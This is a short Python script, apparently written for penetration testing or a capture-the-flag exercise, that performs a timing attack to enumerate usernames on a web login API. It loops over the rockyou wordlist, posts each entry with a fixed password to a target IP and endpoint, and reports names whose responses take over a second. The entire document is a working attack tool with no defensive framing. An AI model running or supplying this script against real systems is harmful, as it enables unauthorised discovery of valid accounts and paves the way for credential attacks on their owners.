#!/usr/bin/python3

#Timing attack to enumerate username

import requests
import time

f = open("/usr/share/wordlists/rockyou.txt", "r")

ip = input("Enter target ip: ")
apiEndpoint = input("Enter api endpoint location: ")
url = (f"http://{ip}{apiEndpoint}")

for i in f:
    creds = {"username": i.strip(), "password": "password123"}
    # print(creds)
    sTime = time.time()
    x = requests.post(url, json=creds)
    eTime = time.time()

    diff = eTime-sTime

    if diff > 1:
        print(f"Possible Username: {str(diff)[0]} {i.strip()}")
